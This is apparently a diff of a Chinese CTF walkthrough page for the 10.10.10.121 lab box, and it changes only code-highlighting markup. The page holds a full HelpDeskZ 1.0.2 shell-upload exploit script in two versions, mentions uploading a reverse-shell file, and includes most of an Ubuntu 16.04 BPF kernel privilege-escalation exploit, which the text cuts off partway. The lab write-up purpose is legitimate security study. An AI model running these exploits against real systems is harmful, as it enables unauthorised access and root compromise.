@@ -144,8 +144,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nmap -T4 -A -v 10.10.10.121
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap -T4 -A -v 10.10.10.121
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -208,35 +208,35 @@
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-
-<span class="nb">print</span> <span class="s1">&#39;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&#39;</span>
-
-<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
-    <span class="nb">print</span> <span class="s2">&#34;Usage: </span><span class="si">{}</span><span class="s2"> [baseUrl] [nameOfUploadedFile]&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-
-<span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-
-<span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
-
-<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
-    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
-    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
-
-    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s1">&#39;.php&#39;</span>
-    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
-        <span class="nb">print</span> <span class="s2">&#34;found!&#34;</span>
-        <span class="nb">print</span> <span class="n">url</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-
-<span class="nb">print</span> <span class="s2">&#34;Sorry, I did not find anything&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Usage: </span><span class="si">{}</span><span class="s2"> [baseUrl] [nameOfUploadedFile]&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">300</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s1">&#39;.php&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;found!&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">url</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;Sorry, I did not find anything&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="漏洞利用">漏洞利用</h2>
 <p>首先，在 submit a ticket 处上传一个反弹 shell 的脚本文件：
@@ -263,8 +263,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python2 poc.py http://10.10.10.121/support/uploads/tickets/ 1.php
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 poc.py http://10.10.10.121/support/uploads/tickets/ 1.php
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>但是此处无论如何都不能访问到 shell，后来经过查询相关资料得知：由于服务器所在地区的时区与国内的时区不一样导致 <code>current - x</code> 得到的数不正确，因此，将脚本稍作改动：</p>
 <div class="highlight"><div class="chroma">
@@ -305,41 +305,41 @@
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
-<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">calendar</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">requests</span>
- 
-<span class="nb">print</span> <span class="s1">&#39;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&#39;</span>
- 
-<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
-    <span class="nb">print</span> <span class="s2">&#34;Usage: </span><span class="si">{}</span><span class="s2"> [baseUrl] [nameOfUploadedFile]&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
- 
-<span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
- 
-<span class="c1"># currentTime = int(time.time())</span>
-<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">helpdeskzBaseUrl</span><span class="p">)</span>
-<span class="n">serverTime</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Date&#34;</span><span class="p">]</span>
-<span class="nb">print</span> <span class="n">serverTime</span>
-<span class="n">timeFormat</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%a</span><span class="s2">, </span><span class="si">%d</span><span class="s2"> %b %Y %H:%M:%S %Z&#34;</span>
-<span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">calendar</span><span class="o">.</span><span class="n">timegm</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">serverTime</span><span class="p">,</span> <span class="n">timeFormat</span><span class="p">)))</span>
-<span class="nb">print</span> <span class="n">currentTime</span>
- 
-<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">90</span><span class="p">):</span>
-    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
-    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
- 
-    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s1">&#39;.php&#39;</span>
-    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
-        <span class="nb">print</span> <span class="s2">&#34;found!&#34;</span>
-        <span class="nb">print</span> <span class="n">url</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
- 
-<span class="nb">print</span> <span class="s2">&#34;Sorry, I did not find anything&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">calendar</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&#39;</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Usage: </span><span class="si">{}</span><span class="s2"> [baseUrl] [nameOfUploadedFile]&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="n">helpdeskzBaseUrl</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">fileName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="c1"># currentTime = int(time.time())</span>
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">helpdeskzBaseUrl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">serverTime</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s2">&#34;Date&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">serverTime</span>
+</span></span><span class="line"><span class="cl"><span class="n">timeFormat</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%a</span><span class="s2">, </span><span class="si">%d</span><span class="s2"> %b %Y %H:%M:%S %Z&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">currentTime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">calendar</span><span class="o">.</span><span class="n">timegm</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">serverTime</span><span class="p">,</span> <span class="n">timeFormat</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">currentTime</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">90</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">plaintext</span> <span class="o">=</span> <span class="n">fileName</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">currentTime</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">md5hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">helpdeskzBaseUrl</span><span class="o">+</span><span class="n">md5hash</span><span class="o">+</span><span class="s1">&#39;.php&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;found!&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">url</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s2">&#34;Sorry, I did not find anything&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>成功反弹 shell：
 <img
@@ -622,254 +622,254 @@
 </span><span class="lnt">247
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
-</span><span class="cm"> * Ubuntu 16.04.4 kernel priv esc
-</span><span class="cm"> *
-</span><span class="cm"> * all credits to @bleidl
-</span><span class="cm"> * - vnik
-</span><span class="cm"> */</span>
-
-<span class="c1">// Tested on:
-</span><span class="c1">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
-</span><span class="c1">// if different kernel adjust CRED offset + check kernel stack size
-</span><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;linux/unistd.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/un.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="cp">#define PHYS_OFFSET 0xffff880000000000
-</span><span class="cp">#define CRED_OFFSET 0x5f8
-</span><span class="cp">#define UID_OFFSET 4
-</span><span class="cp">#define LOG_BUF_SIZE 65536
-</span><span class="cp">#define PROGSIZE 328
-</span><span class="cp"></span>
-<span class="kt">int</span> <span class="n">sockets</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
-<span class="kt">int</span> <span class="n">mapfd</span><span class="p">,</span> <span class="n">progfd</span><span class="p">;</span>
-
-<span class="kt">char</span> <span class="o">*</span><span class="n">__prog</span> <span class="o">=</span>  <span class="s">&#34;</span><span class="se">\xb4\x09\x00\x00\xff\xff\xff\xff</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x55\x09\x02\x00\xff\xff\xff\xff</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x18\x19\x00\x00\x03\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x62\x0a\xfc\xff\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x79\x06\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x62\x0a\xfc\xff\x01\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x79\x07\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x62\x0a\xfc\xff\x02\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x79\x08\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\xbf\x02\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x55\x06\x03\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x79\x73\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x7b\x32\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x55\x06\x02\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x7b\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x7b\x87\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
-        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">;</span>
-
-<span class="kt">char</span> <span class="n">bpf_log_buf</span><span class="p">[</span><span class="n">LOG_BUF_SIZE</span><span class="p">];</span>
-
-<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_prog_type</span> <span class="n">prog_type</span><span class="p">,</span>
-          <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prog_len</span><span class="p">,</span>
-          <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">license</span><span class="p">,</span> <span class="kt">int</span> <span class="n">kern_version</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="p">.</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">prog_type</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">insns</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">insns</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="n">prog_len</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span><span class="p">),</span>
-        <span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">license</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">log_buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">bpf_log_buf</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">log_size</span> <span class="o">=</span> <span class="n">LOG_BUF_SIZE</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
-    <span class="p">};</span>
-
-    <span class="n">attr</span><span class="p">.</span><span class="n">kern_version</span> <span class="o">=</span> <span class="n">kern_version</span><span class="p">;</span>
-
-    <span class="n">bpf_log_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-
-    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_create_map</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_map_type</span> <span class="n">map_type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">key_size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value_size</span><span class="p">,</span>
-           <span class="kt">int</span> <span class="n">max_entries</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="p">.</span><span class="n">map_type</span> <span class="o">=</span> <span class="n">map_type</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">key_size</span> <span class="o">=</span> <span class="n">key_size</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">value_size</span> <span class="o">=</span> <span class="n">value_size</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">max_entries</span> <span class="o">=</span> <span class="n">max_entries</span>
-    <span class="p">};</span>
-
-    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_CREATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_update_elem</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
